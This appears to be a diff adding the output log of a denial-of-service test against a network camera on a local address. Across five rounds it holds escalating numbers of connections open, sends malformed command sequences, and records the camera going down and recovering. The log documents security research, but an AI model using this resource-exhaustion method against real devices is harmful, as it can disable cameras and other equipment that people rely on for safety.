@@ -1,0 +1,91 @@
+[18:22:15] S5 Camera CRASH v3b - Targeted resource exhaustion
+[18:22:15] Target: 192.168.1.131
+[18:22:15] WARNING: May cause extended downtime. AC power required.
+[18:22:15] 
+[18:22:15] Camera confirmed up. Starting attack.
+[18:22:15] 
+
+>>> PHASE A: Escalating fd exhaustion (20->80 conns, 5 rounds)
+[18:22:15] 
+============================================================
+[18:22:15] ROUND 1: 20 held connections + state confusion
+[18:22:15] ============================================================
+[18:22:15]   Opening 20 connections...
+[18:22:16]   Holding 20 open...
+[18:22:16]   [confuse] gate: ok
+[18:22:16]   [confuse] startsenddata: err_critical (14ms)
+[18:22:16]   [confuse] abort: ok
+[18:22:16]   [confuse] restart: err_critical
+[18:22:17]   [confuse] chunk: err_critical (762ms)
+[18:22:17]   [confuse] end: ok
+[18:22:17]   Sending 20 concurrent mixed requests (while fd pool is strained)...
+[18:22:22]   Releasing 20 held connections...
+[18:22:45]   [health] timeout: timed out
+[18:22:45]   Camera in degraded state: timeout: timed out. Waiting 15s...
+[18:23:00]   After wait: OSError: [Errno 64] Host is down
+[18:23:30]   After 30s more: OSError: [Errno 64] Host is down
+[18:23:35] 
+============================================================
+[18:23:35] ROUND 2: 35 held connections + state confusion
+[18:23:35] ============================================================
+[18:23:35]   Opening 35 connections...
+[18:23:36]   Holding 0 open...
+[18:23:36]   [confuse] gate: OSError: [Errno 64] Host is down
+[18:23:36]   [confuse] startsenddata: OSError: [Errno 64] Host is down (0ms)
+[18:23:36]   [confuse] abort: OSError: [Errno 64] Host is down
+[18:23:36]   [confuse] restart: OSError: [Errno 64] Host is down
+[18:23:36]   [confuse] chunk: OSError: [Errno 64] Host is down (0ms)
+[18:23:36]   [confuse] end: OSError: [Errno 64] Host is down
+[18:23:36]   Sending 20 concurrent mixed requests (while fd pool is strained)...
+[18:23:36]   Releasing 0 held connections...
+[18:23:39]   [health] ok
+[18:23:44] 
+============================================================
+[18:23:44] ROUND 3: 50 held connections + state confusion
+[18:23:44] ============================================================
+[18:23:44]   Opening 50 connections...
+[18:23:47]   Holding 50 open...
+[18:23:47]   [confuse] gate: ok
+[18:23:47]   [confuse] startsenddata: err_critical (13ms)
+[18:23:47]   [confuse] abort: ok
+[18:23:48]   [confuse] restart: err_critical
+[18:23:48]   [confuse] chunk: err_critical (949ms)
+[18:23:49]   [confuse] end: ok
+[18:23:49]   Sending 20 concurrent mixed requests (while fd pool is strained)...
+[18:23:54]   Releasing 50 held connections...
+[18:24:17]   [health] timeout: timed out
+[18:24:17]   Camera in degraded state: timeout: timed out. Waiting 15s...
+[18:24:40]   After wait: err_reject
+[18:25:10]   After 30s more: ok
+[18:25:15] 
+============================================================
+[18:25:15] ROUND 4: 65 held connections + state confusion
+[18:25:15] ============================================================
+[18:25:15]   Opening 65 connections...
+[18:25:18]   Holding 65 open...
+[18:25:18]   [confuse] gate: ok
+[18:25:18]   [confuse] startsenddata: err_critical (12ms)
+[18:25:18]   [confuse] abort: ok
+[18:25:18]   [confuse] restart: err_critical
+[18:25:18]   [confuse] chunk: err_critical (648ms)
+[18:25:19]   [confuse] end: ok
+[18:25:19]   Sending 20 concurrent mixed requests (while fd pool is strained)...
+[18:25:24]   Releasing 65 held connections...
+[18:25:47]   [health] timeout: timed out
+[18:25:47]   Camera in degraded state: timeout: timed out. Waiting 15s...
+[18:26:17]   After wait: err_busy
+[18:26:47]   After 30s more: ok
+[18:26:52] 
+============================================================
+[18:26:52] ROUND 5: 80 held connections + state confusion
+[18:26:52] ============================================================
+[18:26:52]   Opening 80 connections...
+[18:26:55]   Holding 80 open...
+[18:27:00]   [confuse] gate: err_critical
+[18:27:05]   [confuse] startsenddata: err_critical (5111ms)
+[18:27:10]   [confuse] abort: err_critical
+[18:27:15]   [confuse] restart: err_critical
+[18:27:15]   [confuse] chunk: err_critical (649ms)
+[18:27:16]   [confuse] end: ok
+[18:27:16]   Sending 20 concurrent mixed requests (while fd pool is strained)...
+[18:27:21]   Releasing 80 held connections...
